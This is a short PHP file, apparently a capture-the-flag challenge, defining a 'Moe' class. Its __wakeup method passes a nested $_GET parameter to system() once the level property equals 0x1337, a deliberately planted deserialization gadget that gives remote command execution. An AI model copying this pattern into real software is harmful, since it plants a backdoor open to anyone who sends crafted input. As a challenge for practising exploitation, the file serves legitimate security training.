<?php

/*
 * This file is part of Kazuma.
 *
 * (c) Sato Kazuma (sato@maid.moe)
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */
namespace Kazuma;

/*
 * 'Moe' class
 * https://a.ppy.sh/10068718_1492492979.png
 * $level(int): the actual moe level of kawaii girl.
 */
class Moe {
	public $level = 0x1336;
	public function __wakeup(){
		$moe = $_GET;
		if($this->level === 0x1337) @system($moe[k][a][w][a][i][i]);
	}
	public function __set($n, $v){
		//if($n !== "level") die('failed');
		$this->$n = (int)$v;
	}
}

?>